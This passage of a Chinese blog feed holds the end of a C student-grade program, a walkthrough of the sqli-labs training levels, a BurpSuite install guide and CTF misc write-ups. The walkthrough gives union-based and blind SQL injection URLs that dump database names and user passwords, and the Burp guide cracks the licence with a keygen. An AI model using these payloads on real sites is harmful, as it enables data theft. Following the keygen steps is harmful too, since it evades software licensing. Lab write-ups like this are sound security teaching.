%-6s %-6s %-6s\n&quot;, &quot;名字&quot;, &quot;学号&quot;, &quot;语文&quot;, &quot;数学&quot;, &quot;英语&quot;, &quot;总分&quot;);                printf(&quot;\t\t\t-------------------------------------------------------------------\n&quot;);                printf(&quot;\t\t\t%-9s %-9d %-6.1f %-6.1f %-6.1f %-6.1f\n&quot;, stu[i].name, stu[i].number, stu[i].chinese, stu[i].math, stu[i].english, stu[i].average);                printf(&quot;\n\n\n&quot;);                printf(&quot;\t\t\t-------------------------按任意键返回上一界面----------------------\n&quot;);                getch();                flag1 = 1;                return;            &#125;        &#125;        if (flag1 == 0)        &#123;            printf(&quot;\n\n&quot;);            printf(&quot;\t\t\t--------------------------查询不到当前学生信息--------------------------\n&quot;);            printf(&quot;\t\t\t------------------------------按任意键返回------------------------------&quot;);            getch();        &#125;    &#125;    if (2 == flag)    &#123;        printf(&quot;\t\t\t--------------------------请输入要查询的学生姓名：--------------------------\n&quot;);        scanf(&quot;%s&quot;, name);        number = nowStudentNumber;   //此处需补        for (int i = 0; i &lt; number; i++)        &#123;            if (0 == strcmp(stu[i].name, name))            &#123;                system(&quot;cls&quot;);                printf(&quot;\n\n\n&quot;);                printf(&quot;\t\t\t%-9s %-9s %-6s %-6s %-6s %-6s\n&quot;, &quot;名字&quot;, &quot;  学号&quot;, &quot;语文&quot;, &quot;数学&quot;, &quot;英语&quot;, &quot;总分&quot;);                printf(&quot;\t\t\t-------------------------------------------------------------------\n&quot;);                printf(&quot;\t\t\t%-9s %-9d %-6.1f %-6.1f %-6.1f %-6.1f\n&quot;, stu[i].name, stu[i].number, stu[i].chinese, stu[i].math, stu[i].english, stu[i].average);                printf(&quot;\n\n\n&quot;);                printf(&quot;\t\t\t-------------------------按任意键返回上一界面----------------------\n&quot;);                getch();                flag1 = 1;                return ;            &#125;        &#125;        if (flag1 == 0)        &#123;            printf(&quot;\n\n&quot;);            printf(&quot;\t\t\t--------------------------查询不到当前学生信息--------------------------\n&quot;);            printf(&quot;\t\t\t------------------------------按任意键返回------------------------------&quot;);            getch();        &#125;    &#125;&#125;//管理员端按学号查询void sort()&#123;    struct isStudent MODLE;    int i, n, j;    n = nowStudentNumber;//此处记录传入的用户个数    isStudent temp[MAX];    for (int h = 0; h &lt; n; h++)    &#123;        temp[h] = stu[h];    &#125;    for (i = 0; i &lt; n; i++)        for (j = 0; j &lt; n - i; j++)            if (temp[j].number &lt; temp[j + 1].number)            &#123;                MODLE = temp[j];                temp[j] = temp[j + 1];                temp[j + 1] = MODLE;            &#125;    system(&quot;cls&quot;);    printf(&quot;\n\n\n&quot;);    printf(&quot;\t\t\t%-9s %-9s %-6s %-6s %-6s %-6s\n&quot;, &quot;   名字&quot;, &quot;  学号&quot;, &quot;语文&quot;, &quot;数学&quot;, &quot;英语&quot;, &quot;总分&quot;);    printf(&quot;\t\t\t-------------------------------------------------------------------\n&quot;);    printf(&quot;\n&quot;);    for (i = 0; i &lt; nowStudentNumber; i++)    &#123;        printf(&quot;\t\t\t%-9s %-10d %-6.1f %-6.1f %-6.1f %-6.1f\n&quot;, temp[i].name, temp[i].number, temp[i].chinese, temp[i].math, temp[i].english, temp[i].average);    &#125;    printf(&quot;\n&quot;);    printf(&quot;\t\t\t--------------------------输入任意键继续--------------------------\n&quot;);    getch();&#125;//按成绩排序void sortGrade()&#123;   //readOut();    struct isStudent MODRE;    int i, n, j;    n = nowStudentNumber;//此处记录传入用户的个数    isStudent temp[MAX];    for (int h = 0; h &lt; n; h++)    &#123;        temp[h] = stu[h];    &#125;    for (i = 0; i &lt; n; i++)        for (j = 0; j &lt; n - i; j++)            if (temp[j].average &lt; temp[j + 1].average)            &#123;                MODRE = temp[j];                temp[j] = temp[j + 1];                temp[j + 1] = MODRE;            &#125;    system(&quot;cls&quot;);    printf(&quot;\n\n\n&quot;);    printf(&quot;\t\t\t%-9s %-9s %-6s %-6s %-6s %-6s\n&quot;, &quot;   名字&quot;, &quot;  学号&quot;, &quot;语文&quot;, &quot;数学&quot;, &quot;英语&quot;, &quot;总分&quot;);    printf(&quot;\t\t\t-------------------------------------------------------------------\n&quot;);    printf(&quot;\n&quot;);    for (i = 0; i &lt; nowStudentNumber; i++)    &#123;        printf(&quot;\t\t\t%-9s %-10d %-6.1f %-6.1f %-6.1f %-6.1f\n&quot;, temp[i].name, temp[i].number, temp[i].chinese, temp[i].math, temp[i].english, temp[i].average);    &#125;    printf(&quot;\n&quot;);    printf(&quot;\t\t\t--------------------------输入任意键继续--------------------------\n&quot;);    getch();&#125;////学生端内容//学生界面void studentInterface(int studentnumber13)//这里形参代表找到的学生学号&#123;    while (1)    &#123;    system(&quot;cls&quot;);            printf(&quot;\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t\t   Welcome to the Student achievement management system\n&quot;);    printf(&quot;\t\t\t\t\t             ～ (((^^)(^^)))    \n&quot;);    printf(&quot;\t\t\t\t\t┌────────────────────────────────────┐\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│  1.查询个人信息                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│  2.修改账号密码                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│  3.退出                            │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t└────────────────────────────────────┘\n&quot;);    printf(&quot;\t\t\t\t\t请输入:&quot;);        int i;        scanf(&quot;%d&quot;, &amp;i);        if (i == 1)        &#123;            studentFindShow(studentnumber13);//searchPersonInformation_asNumber(student* p,len);        &#125;        if (i == 2)        &#123;            changeTheSecurityCode(studentnumber13);//修改账户密码        &#125;        if (i == 3)        &#123;            exit(0);//退出，返回上一界面（go doing）        &#125;        getchar();    &#125;&#125;//学生端密码登录void studentInPWD()&#123;//   for(int j=0;j&lt; nowStudentNumber;j++)//   &#123;////       printf(&quot;%s %d %f %f %f %f %s&quot;,stu[j].name,stu[j].number,stu[j].chinese,stu[j].match,stu[j].english,stu[j].average,stu[j].stu[20]);////   &#125;loop9:  system(&quot;cls&quot;);    printf(&quot;\n\n\n&quot;);    printf(&quot;\t\t\t请输入学号:&quot;);    int studentnumberin;    scanf(&quot;%d&quot;, &amp;studentnumberin);    int flag12=0;//记录学生的账号是哪一个    int flag = 0;//判断是否找到了学生账号    char passwordin[20];//输入的密码    readOut();    for (int i = 0; i &lt; nowStudentNumber; i++)    &#123;        if (stu[i].number == studentnumberin)        &#123;        loop5:    system(&quot;cls&quot;);            printf(&quot;\n\n\n&quot;);            printf(&quot;\t\t\t请输入密码:&quot;);            scanf(&quot;%s&quot;, passwordin);            flag12 = 1;            if (strcmp(passwordin, stu[i].password) == 0)            &#123;                flag = 1;                studentInterface(studentnumberin);//这里将找到的学生编号传到下一界面            &#125;        &#125;    &#125;            if(flag!=0)        &#123;            printf(&quot;\n\n\n\n\n\n&quot;);            printf(&quot;\t\t\t密码输入错误！！&quot;);            sleep(1);            goto loop5;        &#125;        if(flag12!=0)            &#123;            fflush(stdin);            printf(&quot;\n\n\n\n\n\n&quot;);            printf(&quot;\t\t\t账号输入错误！！&quot;);            sleep(2);            goto loop9;            &#125;//            getch();////            system(&quot;cls&quot;);/*    if (flag == 0)    &#123;        printf(&quot;抱歉，查无此账号\n&quot;);        getchar();        getch();        return;    &#125;    *///    getchar();&#125;//学生端展示个人信息void studentFindShow(int studentnumber)&#123;    int flag, s;//此处变量用来接收查询的学号    char name[10];//此处用来接收查询的学生姓名    int flag1 = 0;//此处变量用来无法查询到学号时返回变量    int number;//此处接收用户个数        number = nowStudentNumber;        system(&quot;cls&quot;);        printf(&quot;\n\n\t\t\t%-9s %-9s %-6s %-6s %-6s %-6s\n&quot;, &quot;名字&quot;, &quot;学号&quot;, &quot;语文&quot;, &quot;数学&quot;, &quot;英语&quot;, &quot;总分&quot;);        printf(&quot;\t\t\t-------------------------------------------------------------------\n&quot;);        for (int i = 0; i &lt; number; i++)        &#123;            if (stu[i].number == studentnumber)            &#123;                printf(&quot;\n\t\t\t  %-9s %-9d %-6.1f %-6.1f %-6.1f %-6.1f\n&quot;, stu[i].name, stu[i].number, stu[i].chinese, stu[i].math, stu[i].english, stu[i].average);                printf(&quot;\n\n\n&quot;);                printf(&quot;\t\t\t--------------------------按任意键返回-----------------------------&quot;);                getch();                flag1 = 1;                break;            &#125;        &#125;&#125;//学生端修改密码void changeTheSecurityCode(int studentNumber13)&#123;    system(&quot;cls&quot;);    char tmp1[20];    int i;        for (i = 0; i &lt;= nowStudentNumber; i++)        &#123;            if (stu[i].number == studentNumber13)            &#123;                break;            &#125;        &#125;    printf(&quot;\n\n\n&quot;);    printf(&quot;\t\t\t--------------------------请输入新密码--------------------------\n&quot;);    printf(&quot;\t\t\t&quot;);    scanf(&quot;%s&quot;, &amp;tmp1);    strcpy(stu[i].password, tmp1);    system(&quot;cls&quot;);    writeIn();    printf(&quot;\n\n\n&quot;);    printf(&quot;\t\t\t--------------------------修改密码成功--------------------------\n&quot;);    printf(&quot;\t\t\t--------------------------按任意键返回--------------------------\n&quot;);    getch();    return 0;&#125;//删除学生信息void deleteAccount()&#123;    isStudent Temporary[MAX];//临时数组用来储存内容    int studentnumber=5;//要求的学生学号    int number;//学生人数    int flag = 0;//判断输入是否存在    int g = 0;//除被删学生外其他人计数loop5:  system(&quot;cls&quot;);    printf(&quot;\n\n\n&quot;);    printf(&quot;\t\t\t--------------------------请输入要删除的学生学号:----------------------\n&quot;);    printf(&quot;\t\t\t----------------------------按“0”返回主菜单-------------------------\n&quot;);    printf(&quot;\n\n\t\t\t&quot;);    scanf(&quot;%d&quot;, &amp;studentnumber);            getchar();    if(0==studentnumber)        return ;    number = nowStudentNumber;    for (int i = 0; i &lt; number; i++)    &#123;        if (stu[i].number == studentnumber)        &#123;            flag = 1;            stu[i].number = 0;//将该学生学号归零        &#125;    &#125;    if (flag == 0)    &#123;        printf(&quot;\n\n&quot;);        printf(&quot;\t\t\t-------------------不存在该学生学号，请重新输入----------------------\n&quot;);        Sleep(30);        goto loop5;    &#125;    else    &#123;        for (int j = 0; j &lt; number; j++)//j是stu内学生        &#123;            if (stu[j].number != 0)            &#123;                Temporary[g] = stu[j];//按顺序将内容传输                g++;//这样就是输入一个加一个计数了，判断失败g不加j加一            &#125;        &#125;        char ch;//写入文件        FILE* pFile;        pFile = fopen(&quot;STUDENT.txt&quot;, &quot;w&quot;);//状态，覆写        if (pFile == NULL)        &#123;            printf(&quot;\t\t\t写入文件失败。\n&quot;);            printf(&quot;\t\t\t文件保存错误。\n&quot;);            printf(&quot;\t\t\t输入任意键退出。\n&quot;);            getch();            return 0;//以不正常状态退出        &#125;        else        &#123;            //将所有内容写入文件            for (int i = 0; i &lt; g; i++)            &#123;                fprintf(pFile, &quot;%-9s %-9d %-6.1lf %-6.1lf %-6.1lf %-6.1lf %-22s\n&quot;, Temporary[i].name, Temporary[i].number, Temporary[i].chinese, Temporary[i].math, Temporary[i].english, Temporary[i].average, Temporary[i].password);            &#125;            fclose(pFile);            //getchar();            readOut();            printf(&quot;\t\t\t--------------------------删除成功！-------------------------------------&quot;);            getch();        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs通关教程</title>
      <link href="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
      <url>/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[[sqlmap使用方法]]<br>Mysql 5.0以上 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。 information_schema数据库下有schemata,tables,columns等表。 table_schema是数据库的名称，table_name是具体的表名 </p><p>猜数据库</p><p> select schema_name from information_schema.schemata </p><p> 猜某库的数据表</p><p>  select table_name from information_schema.tables where table_schema=’xxxxx’ </p><p>  猜某表的所有列 </p><p>  Select column_name from information_schema.columns where table_name=’xxxxx’ </p><p>  获取某列的内容 </p><p>  Select *** from ****</p><hr><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1:"></a>less-1:</h1><p>  由回显可以知道提交的语句被’’所包裹</p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/1.png" class=""><p>  接下来可以利用order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错，’order by 4–+的结果显示结果超出。</p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/2.png" class=""><p> 接下来使用联合查询，union 的作用是将两个 sql 语句进行联合。Union 可以从 下面的例子中可以看出，强调一点：union 前后的两个 sql 语句的选择列数要相同才可以。union all 与 union 的区别是增加了去重的功能。</p><p> <code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3--+</code></p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/3.png" class=""><p>  当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据</p><p>  爆数据库：</p><p>  <code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/4.png" class=""><p> 爆security数据库的数据表：</p><p> <code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/5.png" class=""><p>  爆users表的列：</p><p>  <code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/6.png" class=""><p>  爆数据：</p><p>  <code>  http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users  --+</code></p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/7.png" class=""><hr><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h1><hr><p>  <code>http://localhost/sqli-labs-master/Less-2/?id=1</code></p><p>  回显正常</p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/8.png" class=""><p><code>http://localhost/sqli-labs-master/Less-2/?id=1&#39;</code></p><p>报错</p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/9.png" class=""><p>由以上可知当前的注入为数字型注入</p><p>使用order by：</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=1 order by 3--+</code></p><p>得知当为4时报错</p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/10.png" class=""><p>使用联合查询：</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,3 --+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/11.png" class=""><p>爆数据库：</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/12.png" class=""><p>爆security库的表：</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/13.png" class=""><p>爆users表的列：</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/14.png" class=""><p>爆数据：</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users --+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/15.png" class=""><hr><h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3:"></a>less-3:</h1><p>首先通过回显的报错可知正确的代码为：</p><p><code>http://localhost/sqli-labs-master/Less-3/?id=1&#39;)--+</code></p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/16.png" class="">  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/17.png" class=""><p>  使用order by得知当为4的时候报错</p>  <img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/18.png" class=""><p>  使用联合查询：</p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/19.png" class=""><p>爆数据库：<br><code>http://localhost/sqli-labs-master/Less-3/?id=-1 &#39;) union select 1,group_concat(schema_name) ,3 from information_schema.schemata--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/20.png" class=""><p>爆security库的表：</p><p><code>http://localhost/sqli-labs-master/Less-3/?id=-1 &#39;) union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/21.png" class=""><p>爆users表的列：</p><p><code>http://localhost/sqli-labs-master/Less-3/?id=-1 &#39;) union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/22.png" class=""><p>爆数据：</p><p><code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users --+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/23.png" class=""><hr><h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4:"></a>less-4:</h1><p>第四关，我们随便输入一个通过，他的回显可以知道，这道题使用”“和()对id参数进行的包裹，因此我们可以构造出以下的语句：</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=1&quot;)--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/24.png" class=""><p>进行联合查询：</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,2,3--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/25.png" class=""><p>爆数据库：</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/26.png" class=""><p>爆security库的表：</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/27.png" class=""><p>爆user表的列：</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;user&#39;--+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/28.png" class=""><p>爆数据：</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users --+</code></p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/29.png" class=""><h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5:"></a>less-5:</h1><p>通过后端的代码我们可以知道，这个没有回显，对于这一题我们采用盲注的方式。</p><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; and left(version(),1)=5 --+</code></p><p>我们先猜测这个数据库的版本是以5开头的如果不是以5开头的那么页面的回显就会出现错误。通过回显证明数据库的版本的确是以5开头的。通过这种方法我们可以一直试直到把数据库的版本给试出来。</p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/30.png" class=""><p>接下来我们试一下数据库的长度：</p><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; and length(database())=8 --+</code></p><p>结果我们试到8左右就可以了。</p><img src="/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/31.png" class=""><p>接下来我们采用二分法的方法来猜测数据库的第一位。</p><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39;and left(database(),1)&gt; &#39;k&#39;--+</code></p><p>通过这种方式我们可以慢慢的查到数据库的名字。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite 的安装</title>
      <link href="/2022/01/08/BurpSuite/"/>
      <url>/2022/01/08/BurpSuite/</url>
      
        <content type="html"><![CDATA[<h1 id="BurpSuite-的安装"><a href="#BurpSuite-的安装" class="headerlink" title="BurpSuite 的安装"></a>BurpSuite 的安装</h1><p>以下内容仅供交流学习，支持正版<br>参考链接<a href="https://www.sqlsec.com/2020/10/winbp.html">https://www.sqlsec.com/2020/10/winbp.html</a><br>       <a href="https://blog.csdn.net/dantesite/article/details/107916493">https://blog.csdn.net/dantesite/article/details/107916493</a></p><h2 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h2><p>由于最新的BurpSuite需要高版本的JAVA所以我们先配置自己的JAVA环境。<br>这里不再过多赘述，网上都有</p><h2 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h2><p>Burp Suite Professional 2020.11.3<br>平台                      下载链接<br>JAR                     <a href="https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=Jar">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=Jar</a><br>Linux (64-bit)         <a href="https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=Linux">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=Linux</a><br>Mac OSX                   <a href="https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=MacOsx">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=MacOsx</a><br>Windows (64-bit)       <a href="https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=WindowsX64">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=WindowsX64</a><br>Burp Suite Enterprise Edition 2020.11<br>平台                        下载链接<br>Linux (64-bit)        <a href="https://portswigger.net/burp/releases/download?product=enterprise&amp;version=2020.11&amp;type=Linux">https://portswigger.net/burp/releases/download?product=enterprise&amp;version=2020.11&amp;type=Linux</a><br>Mac OSX             <a href="https://portswigger.net/burp/releases/download?product=enterprise&amp;version=2020.11&amp;type=MacOsx">https://portswigger.net/burp/releases/download?product=enterprise&amp;version=2020.11&amp;type=MacOsx</a><br>Windows (64-bit)    <a href="https://portswigger.net/burp/releases/download?product=enterprise&amp;version=2020.11&amp;type=WindowsX64">https://portswigger.net/burp/releases/download?product=enterprise&amp;version=2020.11&amp;type=WindowsX64</a><br>使用之前版本的注册机依然是可以注册成功的，模仿一下之前版本的激活方式进行激活<br>链接：<a href="https://pan.baidu.com/s/16Ujp09AOqT0oN_SJEh0b0w">https://pan.baidu.com/s/16Ujp09AOqT0oN_SJEh0b0w</a><br>提取码：eld1<br>密码：1564k<br>将五个文件放在同一级目录下<br>1.下载两个文件到同一级目录<br>2.解压 Burp Suite Professional 2020.9.2.7z.001<br>注：必须是英文路径。</p><h2 id="三："><a href="#三：" class="headerlink" title="三："></a>三：</h2><p>解压后找到注册机.vbs。</p><img src="/2022/01/08/BurpSuite/2.png" class=""><p>将License Text改为任意值，复制License。<br>点击run</p><img src="/2022/01/08/BurpSuite/3.png" class=""><p>复制上一步生成的该序列号到Burp licence的输入框中。然后点击next进入下一步激活流程。</p><img src="/2022/01/08/BurpSuite/4.png" class=""><p>由于序列号不是官方购买，因此我们需要点击Manual activation，手动离线激活Burp。</p><img src="/2022/01/08/BurpSuite/5.png" class=""><p>点击右侧Copy request，将离线激活请求码复制到激活软件的Activation Request输入框中，在Activation Response中将会自动生成离线激活请求响应码，将该响应码复制到Brup离线激活界面的最后一个输入框中，然后点击next完成激活。</p><img src="/2022/01/08/BurpSuite/6.png" class=""><h2 id="四："><a href="#四：" class="headerlink" title="四："></a>四：</h2><p>给 Burp Suite Professional CN.vbs文件在桌面上创建一个快捷方式：</p><img src="/2022/01/08/BurpSuite/7.png" class=""><p>然后直接 「右键」选择「更改图标」找到 BP 根目录下的 ico 图标应用一下即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC</title>
      <link href="/2021/11/29/MISC/"/>
      <url>/2021/11/29/MISC/</url>
      
        <content type="html"><![CDATA[<h2 id="第一题：签到"><a href="#第一题：签到" class="headerlink" title="第一题：签到"></a>第一题：签到</h2><img src="/2021/11/29/MISC/1.png" class=""><p>有手就行<br>第二题：<br>用PS逐帧分解</p><img src="/2021/11/29/MISC/4.png" class=""><img src="/2021/11/29/MISC/5.png" class=""><img src="/2021/11/29/MISC/6.png" class=""><p>得到flag{he11ohongke}</p><h2 id="第三题：二维码"><a href="#第三题：二维码" class="headerlink" title="第三题：二维码"></a>第三题：二维码</h2><p>得到一个二维码，扫了一下，啥也没出来。<br>用010 Editor扫一下发现了里面有一个压缩包</p><img src="/2021/11/29/MISC/3.png" class=""><p>可见.png的文件尾是AE 42 60 82，我们却发现png的文件尾后还跟着50 4B 03 04，这是.zip的文件头<br>复制50 4B 03 04后的这段内容，新建文件，保存，将文件的后缀改为.zip。后暴力破解压缩包。<br>得到CTF{vjpw_wnoei}</p><h2 id="第四题：你竟然赶我走"><a href="#第四题：你竟然赶我走" class="headerlink" title="第四题：你竟然赶我走"></a>第四题：你竟然赶我走</h2><p>这题比较简单用010 Editor打开就发现了flag</p><img src="/2021/11/29/MISC/7.png" class=""><p>第五题：n种解法<br>一个.exe文件，发现运行不了，用二进制编辑器打开一看发现是个.jpg转成了base64</p><img src="/2021/11/29/MISC/8.png" class=""><p>百度搜一下，在线转换，得到一个二维码</p><img src="/2021/11/29/MISC/9.png" class=""><p>扫一下得到KEY{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="第五题：大白"><a href="#第五题：大白" class="headerlink" title="第五题：大白"></a>第五题：大白</h2><p>根据题目提示发现得改变宽高</p><img src="/2021/11/29/MISC/10.png" class=""><p>用二进制编辑器打开</p><img src="/2021/11/29/MISC/11.png" class=""><p>用二进制打开的.png文件的第二行中，前四位表示的是宽度，后四位表示的是长度<br>将其都修改成00 00 02 A7，再次打开照片就得到了想要的东西</p><img src="/2021/11/29/MISC/12.png" class=""><h2 id="第六题：基础破解"><a href="#第六题：基础破解" class="headerlink" title="第六题：基础破解"></a>第六题：基础破解</h2><p>用爆破手段得到密码</p><img src="/2021/11/29/MISC/13.png" class=""><p>输入得到：ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=<br>是个base64编码，网上搜一下得到flag{70354300a5100ba78068805661b93a5c}</p><h2 id="第七题：乌镇峰会种图"><a href="#第七题：乌镇峰会种图" class="headerlink" title="第七题：乌镇峰会种图"></a>第七题：乌镇峰会种图</h2><p>这题比较简单用010 Editor打开就发现了flag</p><img src="/2021/11/29/MISC/14.png" class=""><h2 id="第八题：文件中的秘密"><a href="#第八题：文件中的秘密" class="headerlink" title="第八题：文件中的秘密"></a>第八题：文件中的秘密</h2><p>用010 Editor打开就发现了flag</p><img src="/2021/11/29/MISC/15.png" class=""><p>flag{870c5a72806115cb5439345d8b014396}</p><h2 id="第九题：LSB"><a href="#第九题：LSB" class="headerlink" title="第九题：LSB"></a>第九题：LSB</h2><p>既然题目已经提示我们是LSB那就直接供出Stegsolve<br>打开发现Red，Blue，Green的0通道的图片上方有东西因此用Data Extract查看<br>Red，Blue，Green的0通道结合起来的东西，后把文件保存为png格式得到</p><img src="/2021/11/29/MISC/16.png" class=""><p>扫一扫得到cumtctf{1sb_i4_s0_Ea4y}</p><h2 id="第十题：wireshark"><a href="#第十题：wireshark" class="headerlink" title="第十题：wireshark"></a>第十题：wireshark</h2><p>下载的文件用wireshark打开</p><img src="/2021/11/29/MISC/17.png" class=""><p>根据题目描述，我们只需要找到，管理员提交的登入请求就ok了</p><img src="/2021/11/29/MISC/19.png" class=""><p>所以直接，用wireshak过滤出POST请求即可<br>http.request.method==”POST”<br>得到 flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><img src="/2021/11/29/MISC/18.png" class=""><h2 id="第十一题：rar"><a href="#第十一题：rar" class="headerlink" 